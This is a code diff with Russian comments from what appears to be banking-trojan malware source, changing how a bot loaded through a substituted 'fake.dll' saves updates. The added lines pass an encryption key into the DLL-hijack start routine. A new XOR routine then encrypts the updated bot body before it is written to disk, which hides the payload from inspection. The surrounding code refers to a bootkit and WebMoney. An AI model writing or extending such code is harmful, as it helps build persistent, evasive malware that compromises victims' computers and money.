@@ -59,6 +59,8 @@ DWORD dwWebMoneySelf = 0;
 char FakeDllPathBot[MAX_PATH]; //путь к шифрованному телу бота (bot.plug)
 char FakeDllPathDll[MAX_PATH]; //путь к самой Fake.dll, ее заменена оригинальная dll
 char FakeDllPathOrigDll[MAX_PATH]; //путь к оригинальной длл
+char FakeDllCryptKey[32]; //ключ для шифрования тела бота
+int FakeDllLenCryptKey = 0; //длина ключа шифрования тела бота
 
 //DWORD dwExplorerPid  = 0; //пид эксплорера
 
@@ -247,8 +249,9 @@ DWORD WINAPI ExplorerEntryPointFromFakeDll( LPVOID lpData )
 // pathBotPlug - путь в котором находится этот бот
 // pathFakeDll - путь к fake.dll 
 // pathOrigDll - путь к длл которую подменили на fake.dll
+// cryptKey, lenCryptKey - ключ и длина ключа для шифрования тела бота при обновлении
 // эти параметры необходимы для удаления и обновления бота
-BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll )
+BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, const char* pathOrigDll, const char* cryptKey, int lenCryptKey )
 {
 //	BOT::Initialize();
 	DLLDBG("StartFromFakeDll", "StartFromFakeDll pathBotPlug: '%s', pathFakeDll: '%s', pathOrigDll: '%s'", pathBotPlug, pathFakeDll, pathOrigDll );
@@ -256,6 +259,8 @@ BOOL WINAPI StartFromFakeDll( const char* pathBotPlug, const char* pathFakeDll, 
 	m_lstrcpy( FakeDllPathBot, pathBotPlug );
 	m_lstrcpy( FakeDllPathDll, pathFakeDll );
 	m_lstrcpy( FakeDllPathOrigDll, pathOrigDll );
+	m_memcpy( FakeDllCryptKey, cryptKey, lenCryptKey );
+	FakeDllLenCryptKey = lenCryptKey;
 
 	if( BOT::BootkitIsRun() ) //если запущен буткит, то удаляем эту версию бота
 	{
@@ -282,10 +287,29 @@ bool UpdateBotBootkit( BYTE* data, int c_data )
 	return WriteBotForBootkit( data, c_data );
 }
 
+static void XorCryptForFakeDll(LPBYTE Key, DWORD KeySize, LPBYTE Buffer, DWORD Size)
+{
+	DWORD a = 0;
+
+	while (a < Size)
+	{
+		DWORD b = 0;
+		while (b < KeySize)
+		{
+			Buffer[a] ^= (Key[b] + (a * b));
+			b++;
+		}
+		a++;
+	}
+}
+
 //обновление тела бота запускаемого через fake.dll
 bool UpdateBotFakeDll( BYTE* data, int c_data )
 {
-	if( File::WriteBufferA( FakeDllPathBot, data, c_data ) == c_data )
+	TMemory mem(c_data);
+	m_memcpy( mem.Buf(), data, c_data );
+	XorCryptForFakeDll( (BYTE*)FakeDllCryptKey, FakeDllLenCryptKey, (BYTE*)mem.Buf(), c_data );
+	if( File::WriteBufferA( FakeDllPathBot, mem.Buf(), c_data ) == c_data )
 		return true;
 	return false;
 }
